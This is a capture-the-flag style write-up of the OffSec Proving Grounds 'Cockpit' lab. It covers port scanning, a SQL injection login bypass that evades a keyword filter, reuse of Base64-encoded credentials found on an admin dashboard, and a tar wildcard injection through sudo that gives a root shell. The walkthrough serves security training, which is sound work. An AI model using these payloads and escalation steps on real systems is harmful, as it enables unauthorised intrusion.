---
title: "[OSCP-Like] - OffSec - Proving Grounds - Cockpit"
authors: Samarth
date: 2025-12-30 12:00:00 +0530
categories: [OffSec, Proving Grounds Practice]
tags: [Linux, Apache, Cockpit, SQL Injection, WAF Evasion, Tar Wildcard Injection]
math: true
mermaid: true
---

![Cockpit - OffSec](/assets/images/writeups/Cockpit-OffSec/banner.png)

## TL;DR

This writeup is based on the [Cockpit](https://portal.offsec.com/machine/cockpit-49474/overview){:target="_blank"} machine. I began with an Nmap scan revealing **SSH (22)**, **HTTP (80)**, and **Cockpit (9090)**. Enumeration of the web server uncovered a `/login.php` page. I bypassed the login using a **SQL Injection** payload (`admin' and 1=1 -- -`), avoiding a WAF filter that blocked `OR` payloads. Inside the admin dashboard, I found Base64 encoded credentials for the user `james`. I used these credentials to log into the **Cockpit** web console and access a terminal. Finally, I exploited a **Tar Wildcard Injection** vulnerability in a sudo command to gain **Root** privileges.

## Scanning Network

I began with an Nmap scan to identify open ports and running services.

```bash
sudo nmap -sS -sV -sC -T4 -p- -v 192.168.128.10 -oN scans/fullport.scan

Nmap scan report for 192.168.128.10
Host is up (0.063s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
9090/tcp open  http    Cockpit web service 198 - 220
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Did not follow redirect to [https://192.168.128.10:9090/](https://192.168.128.10:9090/)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We discovered three open ports:

* **22 (SSH)**: `OpenSSH 8.2p1` running on Ubuntu.

* **80 (HTTP)**: `Apache httpd 2.4.41` hosting a site titled "blaze".

* **9090 (HTTP/SSL)**: `Cockpit web service`.

## Enumeration

I navigated to `http://192.168.128.10` and found a simple landing page promoting a **Masterpiece of a product**.

![Web Browser](/assets/images/writeups/Cockpit-OffSec/1.png)

I performed a directory brute-force scan to identify hidden paths using `gobuster`.

```bash
gobuster dir -t 50 -u [http://192.168.128.10/](http://192.168.128.10/) -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt -s 200 -b ""
```

```bash
/login.php            (Status: 200) [Size: 769]
/index.html           (Status: 200) [Size: 3349]
/.                    (Status: 200) [Size: 3349]
/blocked.html         (Status: 200) [Size: 233]
/db_config.php        (Status: 200) [Size: 0]
```

The scan revealed a critical file: `/login.php`.

I visited `http://192.168.128.10/login.php` and was presented with a login page.

![Blaze Login Page](/assets/images/writeups/Cockpit-OffSec/2.png)

## Exploitation

### SQL Injection (Login Bypass)

Considering the application is using PHP language and there is a login page, the quick assumption was to try SQL injection.

I attempted to inject a single quote `'` into the username field. The application responded with a verbose MySQL error, confirming the assumption.

![Error-based SQL Injection](/assets/images/writeups/Cockpit-OffSec/3.png)

This error confirms the backend is vulnerable and likely uses `LIKE` statements to filter credentials.

I attempted a standard bypass using the `OR` operator:

```bash
admin' or 1=1 -- -
```

However, this payload triggered a security filter, and I was redirected to `/blocked.html`.

![blocked.html](/assets/images/writeups/Cockpit-OffSec/4.png)

Assuming the application was blacklisting the `OR` keyword, I modified my payload to use `AND` instead:

```bash
admin' and 1=1 -- -
```

This payload successfully bypassed the filter and the authentication check, granting me access to the **Admin Dashboard**.

![Admin Dashboard](/assets/images/writeups/Cockpit-OffSec/5.png)

The dashboard revealed a list of users and their passwords, which appeared to be Base64 encoded.

|Username | Password (Encoded) |
|---------|--------------------|
|james |Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=|
|cameron |dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy|

I decoded the passwords found on the dashboard. Using the decoded credentials for the user `james`, I attempted to log in to the **Cockpit** service running on port 9090 (`https://192.168.128.10:9090`).

![Cockpit Web Service](/assets/images/writeups/Cockpit-OffSec/6.png)

The login was successful, granting me access to the system management interface.

![System](/assets/images/writeups/Cockpit-OffSec/7.png)

Once inside, I navigated to the Terminal tab on the left sidebar, which provided me with a fully interactive shell as `james`.

![User Shell](/assets/images/writeups/Cockpit-OffSec/8.png)

## Post Exploitation

I checked the sudo privileges for the `james` user.

```bash
james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

The output shows that I can run `tar` as root with the wildcard `*` argument. This allows for a **Wildcard Injection** attack. When the shell expands `*`, it includes filenames in the current directory.

With the reference of [GTFOBins](https://gtfobins.github.io/gtfobins/tar/){:target="_blank"}, sudo command allows the wildcard `*`, I can exploit shell expansion. By creating files named strictly after the `--checkpoint` flags, I can force `tar` to interpret them as execution instructions rather than filenames.

```bash
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![Root Shell](/assets/images/writeups/Cockpit-OffSec/9.png)

This box demonstrated a chain of misconfigurations starting with a custom web application vulnerable to **SQL Injection** (bypassing a simple WAF). This led to an Information Disclosure of encoded credentials in the admin dashboard. Reusing these credentials granted access to the **Cockpit** web console and a user shell. Finally, a loose Sudo configuration for `tar` allowed for Privilege Escalation via **Wildcard Injection**.

Thanks for reading this far. If you enjoyed the writeup, do support me [here](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.